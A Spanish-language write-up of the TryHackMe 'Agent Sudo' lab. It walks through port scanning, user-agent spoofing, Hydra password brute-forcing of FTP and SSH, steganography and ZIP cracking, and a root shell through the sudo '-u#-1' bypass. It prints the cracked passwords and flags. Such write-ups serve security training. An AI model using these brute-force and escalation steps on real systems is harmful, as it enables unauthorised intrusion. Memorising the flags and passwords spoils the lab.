# Writeup Sudo Agent - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | `10.130.149.126` |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Lo primero que vamos a hacer, es un escaneo inicial de puertos, para saber que tenemos entre nuestras manos:

```bash
sudo nmap -sC -sV -Pn -sS -p- 10.130.149.126 -oN scan_sudo.txt
```

### Resultados del Escaneo

```bash
Nmap scan report for 10.130.149.126
Host is up (0.051s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.99 seconds
```

> Podemos ver que hay tres puertos abiertos en nuestra máquina, FTP, SSH y HTTP. Al acceder al sitio web, podemos ver un sitio web de avisando a agentes que usen su "codename" para acceder a una parte exclusiva del sitio web.
---

## Enumeración

Para ello, usaremos el comando `curl` con la opción `-A` para poder hacernos pasar por otro user-agent y la opción `-L` para ver el contenido del user-agent.

![pagina principal](/imgSudo/image2.png)



```bash
curl -A "R" -L http://10.130.149.126 
```

![resultadocurl](/imgSudo/image.png)

Podemos ver en el area marcada que hay "25 agentes", donde se puede intuir que es el abecedario de la A a la Z, por lo que vamos a probar, apoyandonos en la pista que nos da TryHackMe para encontrar el usuario para poder entrar a la máquina.

```bash
curl -A "C" -L http://10.130.149.126 
```

![resultadocurl](/imgSudo/image3.png)


---

## Explotación

¡Bingo! Tenemos nombre de usuario para poder probar a entrar a la máquina, que es `chris`. Ahora, usaremos el todopoderoso Hydra para poder entrar a la máquina por el resto de puertos (FTP y SSH).

```bash
sudo hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.130.149.126
sudo hydra -l chris -P /usr/share/wordlists/rockyou.txt ssh://10.130.149.126
```

¡Bum! Tenemos la contraseña del servicio FTP, que es `crystal`. Ahora, vamos a entrar al servicio FTP y vamos a ver que tenemos por ahí.

```bash
ftp> dir
229 Entering Extended Passive Mode (|||45525|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||26658|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |************************************|   217      539.22 KiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (4.28 KiB/s)
ftp> get cut
cute-alien.jpg  cutie.png
ftp> get cute-alien.jpg
ftp> get cutie.png
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |************************************| 34842      677.21 KiB/s    00:00 ETA
226 Transfer complete.
```

Podemos ver que hay tres archivos dentro del servicio FTP, asi que hemos descargado todos para saber lo que tenemos que hacer para seguir.

Al abrir el .txt, lo que se ve es que en las imágenes se ha guardado información para para poder sacar la contraseña del ZIP, siendo ya un pequeño reto de esteganografía.

![contenido txt](/imgSudo/image4.png)

Al usar la imagen "cutie.png" con la herramienta binwalk, podemos extraer el ZIP que nos pide TryHackMe para seguir progresando.

```bash
binwalk -e cutie.png
```

![binwalk](/imgSudo/image5.png)

Y ahora para crackear el ZIP, usaremos la herramienta John The Ripper con el conversor de hash zip2john.

```bash
zip2john 8702.zip > zip.hash
                                                                                 
┌──(kali㉿kali)-[~/Downloads/_cutie.png.extracted]
└─$ john zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 3 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE 2/3 (2026-03-29 08:50) 1.724g/s 74868p/s 74868c/s 74868C/s 123456..Open
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
¡Hemos crackeado el zip! Ahora vamos a descomprimirlo y a ver que tenemos por ahí. Hemos encontrado un .txt que hay que enviar la imagen a un texto codificado lo más pronto posible, así que usaremos la herramienta CyberChef para decodificarlo.

```text
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
![cyberchef](/imgSudo/image6.png)

¡Tenemos la contraseña del .jpg! Ahora, vamos a usar steghide para ver que información oculta.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
                                                                                 
┌──(kali㉿kali)-[~/Downloads]
└─$ cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Y ya con la contraseña, tendremos la flag del usuario.


```bash
ssh james@10.130.149.126                         
Last login: Sun Mar 29 12:58:43 2026 from 192.168.130.81
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7

```

---

## Escalada de Privilegios

Ahora, para intentar escalar de privilegios, vamos a usar el comando `sudo -l` para ver si tenemos permisos para ejecutar algún comando como root.

```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

```

Podemos ver que se puede ejecutar el comando /bin/bash con permisos root, así que vamos a buscar el comando en Internet, por si hay alguna vulnerabilidad asociada.

![vulnerabilidad](/imgSudo/image7.png)

¡Hemos encontrado la vulnerabilidad! Al parecer, con el simple comando `sudo -u#-1 /bin/bash` podemos obtener una shell como root.

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# cd /root/
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062
```
